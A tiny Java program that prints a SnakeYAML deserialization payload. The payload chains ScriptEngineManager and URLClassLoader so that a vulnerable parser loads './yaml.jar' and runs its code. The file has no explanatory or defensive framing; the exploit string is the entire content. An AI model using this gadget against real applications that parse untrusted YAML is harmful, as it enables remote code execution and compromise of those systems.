class main {
public static void main(String[] args)throws Exception {
        String context = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"file:./yaml.jar\"]\n" +
                "  ]]\n" +
                "]";
        System.out.println(context);
    }
}
